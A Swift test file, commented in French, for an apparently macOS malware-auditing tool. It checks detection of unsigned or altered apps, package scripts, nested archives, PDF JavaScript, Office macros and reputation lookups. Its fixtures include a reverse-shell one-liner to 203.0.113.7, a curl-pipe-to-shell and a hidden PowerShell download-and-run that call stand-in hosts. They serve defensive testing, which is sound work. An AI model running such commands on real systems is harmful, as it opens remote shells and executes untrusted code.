import CryptoKit
import Foundation
import Testing
@testable import CerbereKit

/// Phase 4 : audit d'une app, d'une image disque, d'un paquet, d'un binaire, d'un document. Les cibles sont
/// fabriquées par `Fabrique` ; aucune n'est lancée, et rien ne sort du Mac (la base de réputation est un faux serveur).
struct AppFichierTests {
    /// Dossier de travail d'un essai, avec sa quarantaine.
    private func jeu() throws -> Jeu {
        let jeu = try Jeu([:])
        try FileManager.default.createDirectory(at: jeu.dossier, withIntermediateDirectories: true)
        return jeu
    }

    private func fiche(_ r: Rapport, _ regle: String) -> String { r.constats(regle).first?.extrait ?? "" }

    @Test func natureDApresLeContenu() throws {
        let jeu = try jeu()
        defer { jeu.nettoyer() }
        let d = jeu.dossier
        try Fabrique.ecrire("bonjour\n", d.appending(path: "dossier/a.txt"))
        try Fabrique.ecrire("<plist/>", d.appending(path: "Vide.app/Contents/Info.plist"))
        try Fabrique.ecrire("#!/bin/sh\n", d.appending(path: "script.command"))
        try Fabrique.zip(d.appending(path: "dossier"), vers: d.appending(path: "archive.zip"))
        // Le nom ne compte pas : un paquet nommé .txt reste un paquet.
        try Data([0x78, 0x61, 0x72, 0x21] + [UInt8](repeating: 0, count: 600)).write(to: d.appending(path: "paquet.txt"))
        try Data([UInt8](repeating: 0, count: 600) + Array("koly".utf8) + [UInt8](repeating: 0, count: 508)).write(to: d.appending(path: "image.bin"))
        func nature(_ nom: String) -> Quarantaine.Nature? { Quarantaine.nature(de: d.appending(path: nom).path) }
        #expect(nature("dossier") == .dossier && nature("Vide.app") == .app && nature("script.command") == .fichier)
        #expect(nature("archive.zip") == .archive && nature("paquet.txt") == .paquet && nature("image.bin") == .image)
        #expect(nature("absent") == nil)
    }

    @Test func appSigneeSurPlace() throws {
        let jeu = try jeu()
        defer { jeu.nettoyer() }
        let app = try Fabrique.app(dans: jeu.dossier)
        let r = try Audit.auditer(app.path, racine: jeu.racine)
        #expect(r.cible.type == .app && r.cible.empreinte?.count == 64)
        // Signature locale : ni développeur ni contrôle d'Apple. Le contenu, lui, n'a pas changé.
        let locale = try #require(r.constats("sig.locale").first)
        #expect(locale.gravite == .elevee && locale.statut == .confirme && locale.fichier == "Essai.app [signature]")
        #expect(!r.a("sig.alteree") && !r.a("sig.absente"))
        #expect(r.verdict == .risque)
        // Sans accord, Gatekeeper n'est pas interrogé.
        #expect(r.couches.gatekeeper == nil && !r.a("sig.gatekeeper") && !r.a("sig.gatekeeper-refus"))
        // Fiche d'identité et agent de lancement (rangé en format binaire, lu quand même).
        #expect(r.constats("app.cachee").first?.gravite == .moyenne)
        #expect(fiche(r, "app.identite").contains("invalid.example.essai") && fiche(r, "app.identite").contains("micro"))
        let agent = try #require(r.constats("app.agent").first)
        #expect(agent.fichier == "Essai.app/Contents/Library/LaunchAgents/invalid.example.essai.agent.plist [contenu]")
        #expect(agent.extrait.contains("/bin/sh -c echo essai") && agent.extrait.contains("lancé au démarrage"))
        // Programme compilé : ce qu'il peut appeler, et ce qu'il contient comme textes.
        let capacites = try #require(r.constats("bin.capacites").first)
        #expect(capacites.fichier == "Essai.app/Contents/MacOS/Essai [imports]")
        for famille in ["trousseau", "chargement de code", "lancement de commandes"] { #expect(capacites.extrait.contains(famille)) }
        #expect(r.reseau.domaines.contains { $0.nom == "collecte.example.invalid" && $0.fichiers == ["Essai.app/Contents/MacOS/Essai [chaînes]"] })
        #expect(r.a("sec.trousseau", dans: "Essai.app/Contents/MacOS/Essai [chaînes]"))
        // Un programme compilé dans une app est attendu : pas de constat pour sa seule présence.
        #expect(!r.a("inventaire.executable"))
        #expect(r.resume.contains("autour des appels sensibles"))
        #expect(((try? FileManager.default.contentsOfDirectory(atPath: jeu.racine.path)) ?? []).isEmpty)
    }

    @Test func appModifieeApresSignatureEtAppSansSignature() throws {
        let jeu = try jeu()
        defer { jeu.nettoyer() }
        let app = try Fabrique.app(dans: jeu.dossier)
        // Une ressource scellée change après la signature.
        try Fabrique.ecrire("#!/bin/sh\necho autre chose\n", app.appending(path: "Contents/Resources/aide.sh"))
        let modifiee = try Audit.auditer(app.path, racine: jeu.racine)
        let alteree = try #require(modifiee.constats("sig.alteree").first)
        #expect(alteree.gravite == .critique && alteree.statut == .confirme && modifiee.verdict == .nePasInstaller)

        let nue = try Fabrique.app(dans: jeu.dossier, nom: "Nue.app", signer: false)
        try Fabrique.outil("/usr/bin/codesign", ["--remove-signature", nue.appending(path: "Contents/MacOS/Essai").path])
        let sans = try Audit.auditer(nue.path, racine: jeu.racine)
        #expect(sans.constats("sig.absente").first?.gravite == .elevee && sans.verdict == .risque)
    }

    @Test func paquetLuSansEtreInstalle() throws {
        let jeu = try jeu()
        defer { jeu.nettoyer() }
        let temoin = jeu.dossier.appending(path: "temoin-paquet")
        let paquet = try Fabrique.paquet(dans: jeu.dossier, temoin: temoin)
        let r = try Audit.auditer(paquet.path, racine: jeu.racine)
        // Le script du paquet a été lu, jamais lancé.
        #expect(!FileManager.default.fileExists(atPath: temoin.path))
        #expect(r.cible.type == .app && r.cible.empreinte == Quarantaine.empreinte(paquet))
        let signature = try #require(r.constats("pkg.non-signe").first)
        #expect(signature.gravite == .elevee && signature.statut == .confirme && signature.fichier == "Essai.pkg [signature]")
        #expect(r.a("inst.pkg", dans: "Scripts/postinstall"))
        let script = try #require(r.constats("obf.telecharge-execute").first)
        #expect(script.fichier == "Scripts/postinstall" && script.statut == .confirme)
        #expect(r.verdict == .risque)
        // La charge du paquet est développée elle aussi.
        #expect(r.fichiersAnalyses >= 3 && r.reseau.domaines.map(\.nom).contains("charge.example.invalid"))
    }

    @Test func imageDisqueMonteeEnLectureSeulePuisDemontee() throws {
        let jeu = try jeu()
        defer { jeu.nettoyer() }
        let contenu = jeu.dossier.appending(path: "volume")
        try FileManager.default.createDirectory(at: contenu, withIntermediateDirectories: true)
        _ = try Fabrique.app(dans: contenu)
        try FileManager.default.createSymbolicLink(atPath: contenu.appending(path: "Applications").path, withDestinationPath: "/Applications")
        let image = jeu.dossier.appending(path: "Essai.dmg")
        try Fabrique.image(de: contenu, vers: image)
        let r = try Audit.auditer(image.path, racine: jeu.racine)
        #expect(r.cible.type == .app && r.cible.empreinte == Quarantaine.empreinte(image))
        #expect(r.constats("sig.image").first?.gravite == .info)
        // L'app de l'image est examinée sur le volume monté, là où ses liens sont intacts.
        #expect(r.constats("sig.locale").first?.fichier == "Essai.dmg!/Essai.app [signature]")
        #expect(r.a("bin.capacites", dans: "Essai.app/Contents/MacOS/Essai [imports]"))
        // Le raccourci habituel vers Applications n'est pas un lien suspect.
        #expect(r.constats("inventaire.lien").allSatisfy { $0.gravite == .info })
        // Plus rien de monté, plus rien en quarantaine.
        #expect(!(try Fabrique.outil("/usr/bin/hdiutil", ["info"])).contains(jeu.racine.path))
        #expect(((try? FileManager.default.contentsOfDirectory(atPath: jeu.racine.path)) ?? []).isEmpty)
    }

    @Test func archivesImbriquees() throws {
        let jeu = try jeu()
        defer { jeu.nettoyer() }
        let d = jeu.dossier
        // Un script dangereux au fond de quatre archives l'une dans l'autre : les trois premières sont ouvertes.
        try Fabrique.ecrire("#!/bin/sh\nbash -i >& /dev/tcp/203.0.113.7/4444 0>&1\n", d.appending(path: "n0/outil.sh"))
        for i in 0..<4 {
            try FileManager.default.createDirectory(at: d.appending(path: "n\(i + 1)"), withIntermediateDirectories: true)
            try Fabrique.zip(d.appending(path: "n\(i)"), vers: d.appending(path: "n\(i + 1)/niveau\(i).zip"))
        }
        let profond = try Audit.auditer(d.appending(path: "n4").path, racine: jeu.racine)
        #expect(profond.nonAnalyse.contains { $0.fichier == "niveau3.zip!/niveau2.zip!/niveau1.zip!/niveau0.zip" && $0.raison.contains("non ouvert") })
        #expect(!profond.a("reseau.shell-inverse"))
        let r = try Audit.auditer(d.appending(path: "n3").path, racine: jeu.racine)
        let shell = try #require(r.constats("reseau.shell-inverse").first)
        #expect(shell.fichier == "niveau2.zip!/niveau1.zip!/niveau0.zip!/outil.sh" && shell.statut == .confirme && r.verdict == .nePasInstaller)
        // Un fichier qui n'a que l'en-tête d'une archive : noté, l'audit continue.
        try Data([0x50, 0x4B, 0x03, 0x04] + [UInt8](repeating: 0, count: 80)).write(to: d.appending(path: "n0/faux.zip"))
        let faux = try Audit.auditer(d.appending(path: "n0").path, racine: jeu.racine)
        #expect(faux.nonAnalyse.contains { $0.fichier == "faux.zip" } && faux.a("reseau.shell-inverse"))
    }

    @Test func fichierSeulEtTexteUTF16() throws {
        let jeu = try jeu()
        defer { jeu.nettoyer() }
        let script = jeu.dossier.appending(path: "Facture.pdf.command")
        try Fabrique.ecrire("#!/bin/sh\ncurl -fsSL https://charge.example.invalid/i.sh | sh\n", script, executable: true)
        let r = try Audit.auditer(script.path, racine: jeu.racine)
        #expect(r.cible.type == .fichier && r.cible.empreinte == Quarantaine.empreinte(script))
        #expect(r.constats("obf.telecharge-execute").first?.statut == .confirme && r.verdict == .risque)
        #expect(r.a("fic.double-suffixe") && r.a("fic.lance-au-clic"))
        // Un script écrit en UTF-16 n'échappe pas aux règles.
        let large = jeu.dossier.appending(path: "large.ps1")
        try #require("powershell -w hidden -c \"iex (iwr https://charge.example.invalid/p)\"\n".data(using: .utf16)).write(to: large)
        #expect(try Audit.auditer(large.path, racine: jeu.racine).a("obf.powershell"))
        // Un programme seul : signature lue, imports et textes aussi.
        let programme = jeu.dossier.appending(path: "outil")
        try Fabrique.programme(programme)
        let p = try Audit.auditer(programme.path, racine: jeu.racine)
        #expect(p.constats("sig.locale").first?.gravite == .faible && p.a("bin.capacites", dans: "outil [imports]"))
    }

    @Test func pdfAvecJavaScript() throws {
        let jeu = try jeu()
        defer { jeu.nettoyer() }
        let d = jeu.dossier.appending(path: "documents")
        try Fabrique.ecrire(Fabrique.pdfAvecScript, d.appending(path: "facture.pdf"))
        try FileManager.default.createDirectory(at: d, withIntermediateDirectories: true)
        try Fabrique.pdfCompresse().write(to: d.appending(path: "cache.pdf"))
        try Fabrique.ecrire(Fabrique.pdfSain, d.appending(path: "sain.pdf"))
        let r = try Audit.auditer(d.path, racine: jeu.racine)
        // Nom « JavaScript » écrit avec un code, action à l'ouverture : relevé, et le code est cité.
        let ouverture = try #require(r.constats("pdf.javascript").first { $0.fichier == "facture.pdf [contenu]" })
        #expect(ouverture.gravite == .elevee && ouverture.titre.contains("ouverture"))
        #expect(r.reseau.domaines.contains { $0.nom == "charge.example.invalid" && $0.fichiers.contains("facture.pdf [contenu]") })
        // Le même danger caché dans un flux compressé.
        let cache = try #require(r.constats("pdf.javascript").first { $0.fichier == "cache.pdf [contenu]" })
        #expect(cache.gravite == .moyenne)
        #expect(Documents.pdf(try Fabrique.pdfCompresse(), chemin: "c.pdf").fiches.first?.lignes.contains { $0.contains("eval(unescape(") } == true)
        #expect(!r.constats.contains { $0.fichier.hasPrefix("sain.pdf") } && !r.nonAnalyse.contains { $0.fichier == "sain.pdf" })
        #expect(Documents.nomsEnClair("/J#61vaScript /#4AS") == "/JavaScript /JS")
    }

    @Test func decompressionVBA() throws {
        // Exemple de la documentation de Microsoft (MS-OVBA, « Normal Compression Example »).
        let compresse: [UInt8] = [0x01, 0x2F, 0xB0, 0x00, 0x23, 0x61, 0x61, 0x61, 0x62, 0x63, 0x64, 0x65, 0x82, 0x66, 0x00, 0x70, 0x61, 0x67, 0x68, 0x69, 0x6A, 0x01, 0x38, 0x08,
                                  0x61, 0x6B, 0x6C, 0x00, 0x30, 0x6D, 0x6E, 0x6F, 0x70, 0x06, 0x71, 0x02, 0x70, 0x04, 0x10, 0x72, 0x73, 0x74, 0x75, 0x76, 0x10, 0x77, 0x78, 0x79,
                                  0x7A, 0x00, 0x3C]
        let clair = try #require(Documents.decompresserVBA(compresse, depuis: 0))
        #expect(String(decoding: clair, as: UTF8.self) == "#aaabcdefaaaaghijaaaaaklaaamnopqaaaaaaaaaaaarstuvwxyzaaa")
        // Aller et retour avec la compression des essais (bloc plein recopié, puis bloc en octets isolés).
        let texte = Array(String(repeating: "Sub Essai()\r\nEnd Sub\r\n", count: 250).utf8)
        #expect(Documents.decompresserVBA(Fabrique.compresserVBA(texte), depuis: 0) == texte)
        #expect(Documents.decompresserVBA([0x00, 0x01], depuis: 0) == nil)
    }

    @Test func documentAMacros() throws {
        let jeu = try jeu()
        defer { jeu.nettoyer() }
        let d = jeu.dossier.appending(path: "documents")
        try FileManager.default.createDirectory(at: d.appending(path: "word"), withIntermediateDirectories: true)
        try Fabrique.ole().write(to: d.appending(path: "facture.doc"))
        let r = try Audit.auditer(d.appending(path: "facture.doc").path, racine: jeu.racine)
        let macro = try #require(r.constats("doc.macro-auto-commande").first)
        #expect(macro.gravite == .critique && macro.statut == .suspect && macro.fichier == "facture.doc [macros]" && macro.extrait == "Sub AutoOpen()")
        #expect(r.constats("doc.macro-commande").first?.extrait.contains("Shell") == true)
        #expect(r.verdict == .risque && r.reseau.domaines.map(\.nom) == ["charge.example.invalid"])

        // Format récent : une archive qui contient le même conteneur de macros, et un modèle chargé à distance.
        try Fabrique.ole().write(to: d.appending(path: "word/vbaProject.bin"))
        try Fabrique.ecrire(#"<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://modele.example.invalid/m.dotm" TargetMode="External"/></Relationships>"#,
                            d.appending(path: "word/_rels/settings.xml.rels"))
        try FileManager.default.removeItem(at: d.appending(path: "facture.doc"))
        let docm = jeu.dossier.appending(path: "facture.docm")
        try Fabrique.zip(d, vers: docm)
        let recent = try Audit.auditer(docm.path, racine: jeu.racine)
        #expect(recent.a("doc.macro-auto-commande", dans: "archive/word/vbaProject.bin [macros]"))
        #expect(recent.a("doc.modele-distant", dans: "archive/word/_rels/settings.xml.rels"))

        // Petit module, rangé par blocs de 64 octets dans le flux de la racine (le cas courant) : lu de la même façon.
        let petit = Documents.ole(Fabrique.ole(petit: true), chemin: "petit.doc")
        #expect(petit.constats.map(\.regle) == ["doc.macro-auto-commande", "doc.macro-commande"])
        #expect(petit.fiches.first?.lignes.contains("Sub AutoOpen()") == true)

        // Sans lancement automatique ni commande : simple mention.
        let calme = Documents.ole(Fabrique.ole(macro: "Attribute VB_Name = \"M\"\r\nSub Total()\r\n    x = 1 + 1\r\nEnd Sub\r\n"), chemin: "calme.doc")
        #expect(calme.constats.map(\.regle) == ["doc.macros"] && calme.constats.first?.gravite == .faible)
    }

    /// Un vrai document Word, écrit par l'outil du système à partir de notre texte : le conteneur est lu comme
    /// celui fabriqué pour les essais.
    @Test func vraiConteneurOLE() throws {
        let jeu = try jeu()
        defer { jeu.nettoyer() }
        let texte = jeu.dossier.appending(path: "note.txt"), doc = jeu.dossier.appending(path: "note.doc")
        try Fabrique.ecrire("Bonjour, ceci est un essai.\n", texte)
        try Fabrique.outil("/usr/bin/textutil", ["-convert", "doc", texte.path, "-output", doc.path])
        let flux = try #require(Documents.fluxOLE(try Data(contentsOf: doc)))
        #expect(flux.map(\.nom).sorted() == ["\u{5}DocumentSummaryInformation", "\u{5}SummaryInformation", "1Table", "WordDocument"])
        #expect(flux.allSatisfy { $0.contenu.count == 4096 } && flux.contains { $0.nom == "WordDocument" && $0.contenu.starts(with: [0xEC, 0xA5]) })
        let r = try Audit.auditer(doc.path, racine: jeu.racine)
        #expect(r.constats.filter { $0.gravite <= .moyenne }.isEmpty && r.nonAnalyse.isEmpty)
    }

    @Test func reputationSeuleLEmpreintePart() throws {
        let jeu = try jeu()
        defer { jeu.nettoyer() }
        let fichier = jeu.dossier.appending(path: "Document confidentiel de Jean.command")
        try Fabrique.ecrire("#!/bin/sh\necho bonjour\n", fichier)
        let empreinte = try #require(Quarantaine.empreinte(fichier))
        let recues = Requetes()
        func base(_ code: Int, _ corps: String) -> Reputation {
            Reputation(cle: "cle-d-essai-0123456789") { requete, _ in
                recues.ajouter(requete)
                return (code, Data(corps.utf8))
            }
        }
        let malveillant = #"{"data":{"attributes":{"last_analysis_stats":{"malicious":41,"suspicious":2,"undetected":20,"harmless":0},"popular_threat_classification":{"suggested_threat_label":"trojan.essai/<b>x"}}}}"#
        let r = try Audit.auditer(fichier.path, racine: jeu.racine, enLigne: EnLigne(reputation: base(200, malveillant)))
        // Une seule question, vers le seul domaine prévu, avec l'empreinte et rien d'autre : ni nom, ni chemin, ni contenu.
        let requete = try #require(recues.toutes.first)
        #expect(recues.toutes.count == 1)
        #expect(requete.url?.absoluteString == "https://www.virustotal.com/api/v3/files/\(empreinte)")
        #expect(requete.httpMethod == "GET" && requete.httpBody == nil && requete.httpBodyStream == nil)
        #expect(Set(requete.allHTTPHeaderFields?.keys.map { $0.lowercased() } ?? []) == ["x-apikey", "accept", "user-agent"])
        let connu = try #require(r.constats("rep.malveillant").first)
        #expect(connu.gravite == .critique && connu.statut == .confirme && connu.extrait.contains("41 antivirus sur 63") && connu.extrait.contains("trojan.essai/bx"))
        #expect(r.verdict == .nePasInstaller && r.couches.reputation == true)

        #expect(try Audit.auditer(fichier.path, racine: jeu.racine, enLigne: EnLigne(reputation: base(404, "{}"))).constats("rep.inconnu").first?.gravite == .info)
        let sain = #"{"data":{"attributes":{"last_analysis_stats":{"malicious":0,"suspicious":0,"undetected":60,"harmless":3}}}}"#
        #expect(try Audit.auditer(fichier.path, racine: jeu.racine, enLigne: EnLigne(reputation: base(200, sain))).a("rep.connu"))
        // Clé refusée : dit dans le rapport, le reste de l'audit est gardé.
        let refuse = try Audit.auditer(fichier.path, racine: jeu.racine, enLigne: EnLigne(reputation: base(401, "")))
        #expect(refuse.nonAnalyse.contains { $0.raison.contains("clé VirusTotal refusée") } && refuse.couches.reputation == nil)
        // Sans accord : aucune question.
        let avant = recues.toutes.count
        _ = try Audit.auditer(fichier.path, racine: jeu.racine)
        #expect(recues.toutes.count == avant)
        #expect(throws: Reputation.Erreur.empreinte) { try Reputation.requete("../../etc/passwd", cle: "x") }
        // L'envoi réel refuse tout autre domaine, avant de contacter quoi que ce soit.
        #expect(throws: Reputation.Erreur.self) { try Reputation.envoyer(URLRequest(url: URL(string: "https://exemple.invalid/api/v3/files/\(empreinte)")!), annulation: nil) }
    }

    @Test func appDansUneArchiveEtEmpreintesEnvoyees() throws {
        let jeu = try jeu()
        defer { jeu.nettoyer() }
        let contenu = jeu.dossier.appending(path: "contenu")
        try FileManager.default.createDirectory(at: contenu, withIntermediateDirectories: true)
        let app = try Fabrique.app(dans: contenu)
        let archive = jeu.dossier.appending(path: "Essai.zip")
        try Fabrique.zip(contenu, vers: archive)
        let recues = Requetes()
        let base = Reputation(cle: "cle-d-essai-0123456789") { requete, _ in
            recues.ajouter(requete)
            return (404, Data())
        }
        let r = try Audit.auditer(archive.path, racine: jeu.racine, enLigne: EnLigne(reputation: base))
        #expect(r.constats("sig.locale").first?.fichier == "archive/Essai.app [signature]")
        // Deux empreintes : l'archive, puis le programme principal de l'app qu'elle contient.
        let principal = try #require(Quarantaine.empreinte(app.appending(path: "Contents/MacOS/Essai")))
        #expect(recues.toutes.compactMap { $0.url?.lastPathComponent } == [try #require(Quarantaine.empreinte(archive)), principal])
        #expect(r.constats("rep.inconnu").map(\.fichier) == ["Essai.zip", "archive/Essai.app/Contents/MacOS/Essai"])
    }

    @Test func lectureParIADUneApp() throws {
        let jeu = try jeu()
        defer { jeu.nettoyer() }
        let app = try Fabrique.app(dans: jeu.dossier)
        let moteur = FauxMoteur { question, _ in
            switch question {
            case .lecture: FauxMoteur.json(["constats": [
                FauxMoteur.constat("elevee", categorie: "reseau", fichier: "Essai.app/Contents/MacOS/Essai [chaînes]", ligne: 2, extrait: "https://collecte.example.invalid/envoi"),
            ], "notes": "App d'essai."])
            case .relecture: FauxMoteur.json(["avis": [["id": "I1", "decision": "garder", "raison": "exact"]]])
            case .synthese: FauxMoteur.json(["resume": "L'app contient une adresse d'envoi."])
            }
        }
        var apercu: LectureIA.Apercu?
        let r = try Audit.auditer(app.path, racine: jeu.racine) { regles, inventaire in
            apercu = LectureIA.apercu(inventaire, constats: regles.constats)
            return LectureIA.completerOuNoter(regles, inventaire: inventaire, moteur: moteur)
        }
        // Une app du Mac ne part qu'après accord ; ce qui part, ce sont ses textes et les fiches tirées de ses binaires.
        #expect(Confidentialite.accordRequis(cible: app.path))
        #expect((apercu?.fichiers ?? 0) >= 4)
        let envoi = try #require(moteur.envois.first { $0.contains("<<<FICHIER") })
        for fiche in ["Essai.app [signature]", "Essai.app/Contents/MacOS/Essai [imports]", "Essai.app/Contents/MacOS/Essai [chaînes]"] { #expect(envoi.contains("chemin=\"\(fiche)\"")) }
        // La citation de l'IA est vérifiée dans la fiche, comme dans un fichier de code.
        let ia = try #require(r.constats.first { $0.origine == .ia })
        #expect(ia.fichier == "Essai.app/Contents/MacOS/Essai [chaînes]" && ia.extrait.contains("collecte.example.invalid"))
        #expect(r.couches.ia && r.verdict == .risque)
    }
}

private final class Requetes: @unchecked Sendable {
    private var liste: [URLRequest] = []
    private let verrou = NSLock()

    func ajouter(_ r: URLRequest) {
        verrou.lock()
        liste.append(r)
        verrou.unlock()
    }

    var toutes: [URLRequest] {
        verrou.lock()
        defer { verrou.unlock() }
        return liste
    }
}
